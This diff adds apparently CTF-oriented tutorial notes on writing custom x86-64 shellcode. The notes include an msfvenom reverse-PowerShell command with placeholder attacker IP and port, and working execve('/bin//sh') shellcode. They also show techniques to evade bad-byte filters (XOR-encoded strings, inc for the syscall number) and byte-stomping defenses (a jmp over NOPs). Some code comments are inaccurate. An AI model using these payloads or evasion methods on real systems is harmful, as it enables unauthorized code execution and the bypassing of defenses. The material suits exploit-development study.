@@ -1,0 +1,195 @@
+One thing I noticed doing challenges involving shellcode is how we take for granted shellcode generation.
+
+We can use libraries like shellcraft or payload generation tools like msfvenom.
+
+We can avoid bad characters with these with certain switches/options but what if any of these bad bytes involve important
+intructions?
+
+Sure we can generate with msfvenom:
+
+msfvenom -p cmd/windows/reverse_powershell LHOST=<your-ip> LPORT=<your-port> CMD="dir" -b "<badchars>" -f raw
+
+And we can keep adding bad chars to the command above and that might work, but what in cases were we need to add a jump instruction
+because the program changes our shellcode? 
+
+That's why it's important to be able to make your own assembly and generate our shellcode. It's assumed you understand basic assembly.
+
+This is the most basic shell in assembly 64-bit x86-64:
+
+[+]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[+]
+
+
+xor    rsi,rsi                 ; resets rsi
+push   rsi                     ; pushes rsi on top of the stack (NULL)
+mov rdi,0x68732f2f6e69622f     ; moves /bin//sh into rdi (in little endian) => unhex 68732f2f6e69622f (the extra / was for padding)
+push   rdi                     ; pushes rdi on top of the stack
+push   rsp                     ; pushes NULL into the stack
+pop    rdi                     ; pops the last value (without being null) from the stack
+push   0x3b                    ; opcode for the execve function, which will run the shell
+pop    rax		       ; rax is used for syscal
+syscall                        ; execve('/bin//sh', NULL, NULL), remember execve takes a pointer as the first argument
+
+[-]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[-]
+
+For a lot of the important syscall codes, check the cheatsheet!
+
+How do we get the shellcode for this? We can add the '_start primitive' and compile the project:
+
+[+]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[+]
+
+section .text
+    global _start
+
+_start:
+    xor rsi, rsi
+    push rsi
+    mov rdi, 0x9941791932927299
+    mov r9, 0xf13256365cfb10b6
+    xor rdi, r9
+    push rdi
+    push rsp
+    pop rdi
+    push 0x3a
+    pop rax
+    inc rax
+    syscall
+
+[-]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[-]
+
+=> For x64
+nasm -f elf64 -o shellcode.o testShellcodeGenerator.asm
+ld -o shellcode shellcode.o
+
+=> For 32
+nasm -f elf32 -o shellcode.o testShellcodeGenerator.asm
+ld -m elf_i386 -o shellcode shellcode.o
+
+=> To get the shellcode (this will also show instructions and addresses)
+objdump -d shellcode
+
+=> To get in \x format
+objdump -d shellcode | awk '{for(i=2; i<=NF; i++) if($i ~ /^[0-9a-f]{2}$/) printf "\\x%s", $i}'
+
+Time for some examples on how to bypass some defenses.
+
+Defense 1 (Searching for banned words):
+
+
+for (int i = 0; i < len; i++)
+    {
+        // Hackers seem to use these a lot hmm
+        if (buffer[i] == 0x3b ||
+                buffer[i] == '/' ||
+                buffer[i] == 'b' ||
+                buffer[i] == 'i' ||
+                buffer[i] == 'n' ||
+                buffer[i] == 's' ||
+                buffer[i] == 'h')
+            return 0;
+    }
+
+
+One way to bypass this is by performing arithemic operations with the registers so they don't hold the banned characters themselves:
+
+=> Instead of 0x3b we can use 0x3a + 1
+=> Instead of /bin//sh (0x68732f2f6e69622f) we XOR two values that output /bin//sh.
+
+The first one is very easy all we have to do is to introduce an inc (increment) instruction:
+
+[+]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[+]
+
+...
+push 0x3a
+pop rax
+inc rax
+syscall
+
+[-]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[-]
+
+The second one is also easy but may take some time to get the two numbers:
+
+1. 0x68732f2f6e69622f XOR 0x0101010101010101(random number) = result
+2. Repeat the above process with random numbers until both the numbers to be XOR'd don't have any of the banned chars.
+3. Move both numbers to a register, perform the XOR and store back in RDI.
+
+[+]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[+]
+
+...
+mov rdi, 0x9941791932927299
+mov r9, 0xf13256365cfb10b6
+xor rdi, r9
+...
+
+[-]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[-]
+
+Now compile the whole code and generate your shellcode (like we did above).
+
+
+Defense 2 (Stomping our shellcode):
+
+// Stomp over some shellcode (added constraints)
+    shellcode[16] = '\xff';
+    shellcode[17] = '\xe3';
+    shellcode[18] = '\xff';
+    shellcode[19] = '\xe7';
+
+Let's say we have the following shellcode:
+
+shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
+
+That corresponds to the following assembly:
+
+[+]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[+]
+
+xor esi, esi                   
+movabs rbx, 0x68732f2f6e69622f
+push rsi
+push rbx
+push rsp
+pop rdi
+push 0x3b
+pop rax
+xor edx, edx
+syscall
+
+[-]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[-]
+
+The defenses above would stomp out the bytes from 16 to 19 which would ruin our payload.
+
+We can bypass this defense by adding a jump instruction and NOP the the positions that would be stomped.
+
+Why the jump?
+Why the NOP?
+
+The nop is so that none of our shellcode is corrupted.
+The jump is so that our shellcode runs contiguisly (the NOPS don't interfere).
+
+The JMP instruction in shellcode is 0xEB. The offset to add to the JMP instruction is 4 since the defenses stomp 4 bytes.
+
+So we would need to add \xEB\x04\x00\x00\x00\x00 to our original payload at byte position 15.
+
+This would be our assembly:
+
+[+]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[+]
+
+xor esi, esi                   
+movabs rbx, 0x68732f2f6e69622f
+push rsi
+push rbx
+jmp $+4
+nop
+nop
+nop
+nop
+push rsp
+pop rdi
+push 0x3b
+pop rax
+xor edx, edx
+syscall
+
+[-]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[-]
+
+Our final shellcode:
+
+shellcode ="\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\xEB\x04\x90\x90\x90\x90\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05\x00"
